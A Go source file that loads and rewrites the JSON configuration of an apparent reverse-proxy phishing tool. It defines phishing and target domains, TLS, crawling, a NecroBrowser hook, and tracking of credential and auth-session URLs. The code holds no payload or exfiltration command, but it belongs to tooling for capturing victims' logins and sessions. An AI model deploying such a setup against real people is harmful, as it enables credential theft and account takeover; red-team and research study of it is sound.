package session

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"sort"
	"strings"

	"github.com/evilsocket/islazy/tui"
	"github.com/pkg/errors"
)

// Configuration struct for JSON configuration
type Configuration struct {
	Protocol            string   `json:"-"`
	InstrumentationPort int      `json:"-"`
	SkipExtensions      []string `json:"-"`

	//
	// Proxy rules
	//
	Proxy struct {
		Phishing string `json:"phishing"`
		Target   string `json:"destination"`

		Listener struct {
			IP          string `json:"IP"`
			Port        int    `json:"port"`
		} `json:"listener"`

		SkipContentType []string `json:"skipContentType"`

		Transform struct {
			Base64 struct {
				Enabled bool     `json:"enabled"`
				Padding []string `json:"padding"`
			} `json:"base64"`

			Request struct {
				Header []string `json:"header"`
			} `json:"request"`

			Response struct {
				Header []string   `json:"header"`
				Custom [][]string `json:"custom"`
			} `json:"response"`
		} `json:"transform"`

		Remove struct {
			Request struct {
				Header []string `json:"header"`
			} `json:"request"`

			Response struct {
				Header []string `json:"header"`
			} `json:"response"`
		} `json:"remove"`

		Drop []struct {
			Url        string `json:"url"`
			RedirectTo string `json:"redirectTo"`
		} `json:"drop"`

		Log struct {
			Enabled  bool   `json:"enabled"`
			FilePath string `json:"filePath"`
		} `json:"log"`
	} `json:"proxy"`

	//
	// TLS
	//
	TLS struct {
		Enabled         bool   `json:"enabled"`
		Expand          bool   `json:"expand"`
		Certificate     string `json:"certificate"`
		CertificateFile string `json:"-"`
		Key             string `json:"key"`
		KeyFile         string `json:"-"`
		Root            string `json:"root"`
		RootFile        string `json:"-"`
	} `json:"tls"`

	//
	// Crawler & Origins
	//

	Crawler struct {
		Enabled bool `json:"enabled"`
		Depth   int  `json:"depth"`
		UpTo    int  `json:"upto"`

		ExternalOriginPrefix string            `json:"externalOriginPrefix"`
		ExternalOrigins      []string          `json:"externalOrigins"`
		OriginsMapping       map[string]string `json:"-"`
	} `json:"crawler"`

	//
	// Necrobrowser
	//
	NecroBrowser struct {
		Enabled  bool     `json:"enabled"`
		Endpoint string   `json:"endpoint"`
		Token    string   `json:"token"`
		Profile  string   `json:"profile"`
		Keywords []string `json:"keywords"`
	} `json:"necrobrowser"`

	//
	// Static Server
	//
	StaticServer struct {
		Enabled   bool   `json:"enabled"`
		Port      int    `json:"port"`
		LocalPath string `json:"localPath"`
		URLPath   string `json:"urlPath"`
	} `json:"staticServer"`

	//
	// Tracking
	//
	Tracking struct {
		Enabled    bool   `json:"enabled"`
		Type       string `json:"type"`
		Identifier string `json:"identifier"`
		Domain     string `json:"domain"`
		IPSource   string `json:"ipSource"`
		Regex      string `json:"regex"`

		Urls struct {
			Credentials []string `json:"credentials"`
			AuthSession []string `json:"authSession"`
		} `json:"urls"`
		Params   []string `json:"params"`
		Patterns []struct {
			Label    string `json:"label"`
			Matching string `json:"matching"`
			Start    string `json:"start"`
			End      string `json:"end"`
		} `json:"patterns"`
	} `json:"tracking"`
}

// GetConfiguration returns the configuration object
func (s *Session) GetConfiguration() (err error) {

	cb, err := ioutil.ReadFile(*s.Options.ConfigFilePath)
	if err != nil {
		return errors.New(fmt.Sprintf("Error reading configuration file %s: %s", *s.Options.ConfigFilePath, err))
	}
	if err := json.Unmarshal(cb, &s.Config); err != nil {
		return errors.New(fmt.Sprintf("Error unmarshalling JSON configuration file %s: %s", *s.Options.ConfigFilePath, err))
	}

	if s.Config.Proxy.Phishing == "" || s.Config.Proxy.Target == "" {
		return errors.New(fmt.Sprintf("Missing phishing/destination from configuration!"))
	}

	// Listening
	if s.Config.Proxy.Listener.IP == "" {
		s.Config.Proxy.Listener.IP = "0.0.0.0"
	}

	if s.Config.Proxy.Listener.Port == 0 {
		s.Config.Proxy.Listener.Port = 80
		if s.Config.TLS.Enabled {
			s.Config.Proxy.Listener.Port = 443
		}
	}

	// Load TLS config
	s.Config.Protocol = "http://"

	if s.Config.TLS.Enabled {

		// Load TLS Certificate
		s.Config.TLS.CertificateFile = s.Config.TLS.Certificate
		if !strings.HasPrefix(s.Config.TLS.Certificate, "-----BEGIN CERTIFICATE-----\n") {
			er := errors.New(fmt.Sprintf("Error reading TLS cert %s: %s", s.Config.TLS.Certificate, err))
			if _, err := os.Stat(s.Config.TLS.CertificateFile); err == nil {
				crt, err := ioutil.ReadFile(s.Config.TLS.CertificateFile)
				if err != nil {
					return er
				}
				s.Config.TLS.Certificate = string(crt)
			} else {
				return er
			}
		}

		// Load TLS Root CA Certificate
		s.Config.TLS.RootFile = s.Config.TLS.Root
		if !strings.HasPrefix(s.Config.TLS.Root, "-----BEGIN CERTIFICATE-----\n") {
			er := errors.New(fmt.Sprintf("Error reading TLS cert pool %s: %s", s.Config.TLS.Root, err))
			if _, err := os.Stat(s.Config.TLS.RootFile); err == nil {
				crtp, err := ioutil.ReadFile(s.Config.TLS.RootFile)
				if err != nil {
					return er
				}
				s.Config.TLS.Root = string(crtp)
			} else {
				return er
			}
		}

		// Load TLS Certificate Key
		s.Config.TLS.KeyFile = s.Config.TLS.Key
		if !strings.HasPrefix(s.Config.TLS.Key, "-----BEGIN") {
			er := errors.New(fmt.Sprintf("Error reading TLS cert key %s: %s", s.Config.TLS.Key, err))
			if _, err := os.Stat(s.Config.TLS.KeyFile); err == nil {
				k, err := ioutil.ReadFile(s.Config.TLS.KeyFile)
				if err != nil {
					return er
				}
				s.Config.TLS.Key = string(k)
			} else {
				return er
			}
		}

		s.Config.Protocol = "https://"
	}

	s.Config.Crawler.OriginsMapping = make(map[string]string)

	s.Config.InstrumentationPort = 9223
	s.Config.SkipExtensions = []string{
		"ttf", "otf", "woff", "woff2", "eot", //fonts and images
		"ase", "art", "bmp", "blp", "cd5", "cit", "cpt", "cr2", "cut", "dds", "dib", "djvu", "egt", "exif", "gif",
		"gpl", "grf", "icns", "ico", "iff", "jng", "jpeg", "jpg", "jfif", "jp2", "jps", "lbm", "max", "miff", "mng",
		"msp", "nitf", "ota", "pbm", "pc1", "pc2", "pc3", "pcf", "pcx", "pdn", "pgm", "PI1", "PI2", "PI3", "pict",
		"pct", "pnm", "pns", "ppm", "psb", "psd", "pdd", "psp", "px", "pxm", "pxr", "qfx", "raw", "rle", "sct", "sgi",
		"rgb", "int", "bw", "tga", "tiff", "tif", "vtf", "xbm", "xcf", "xpm", "3dv", "amf", "ai", "awg", "cgm", "cdr",
		"cmx", "dxf", "e2d", "egt", "eps", "fs", "gbr", "odg", "svg", "stl", "vrml", "x3d", "sxd", "v2d", "vnd", "wmf",
		"emf", "art", "xar", "png", "webp", "jxr", "hdp", "wdp", "cur", "ecw", "iff", "lbm", "liff", "nrrd", "pam",
		"pcx", "pgf", "sgi", "rgb", "rgba", "bw", "int", "inta", "sid", "ras", "sun", "tga"}

	return
}

func (s *Session) UpdateConfiguration(externalOrigins, subdomains, uniqueDomains *[]string) (err error) {
	config := s.Config

	// ASCII tables on the terminal
	columns := []string{"Domains", "#"}
	rows := [][]string{
		{"External domains", fmt.Sprintf("%v", len(*externalOrigins))},
		{"Subdomains", fmt.Sprintf("%v", len(*subdomains))},
		{"----------------", fmt.Sprintf("---")},
		{"Unique domains", fmt.Sprintf("%v", len(*uniqueDomains))},
	}

	tui.Table(os.Stdout, columns, rows)

	//
	// Update config
	//
	// Disable crawler and update external domains
	sort.Sort(sort.StringSlice(*externalOrigins))
	config.Crawler.ExternalOrigins = *externalOrigins
	config.Crawler.Enabled = false

	// Update TLS accordingly
	if !config.TLS.Expand {
		config.TLS.Root = config.TLS.RootFile
		config.TLS.Key = config.TLS.KeyFile
		config.TLS.Certificate = config.TLS.CertificateFile
	}

	newConf, err := json.MarshalIndent(config, "", "\t")
	path := *s.Options.ConfigFilePath
	if err != nil {
		return
	}
	if err = ioutil.WriteFile(path, newConf, 0644); err != nil {
		return
	}

	return
}
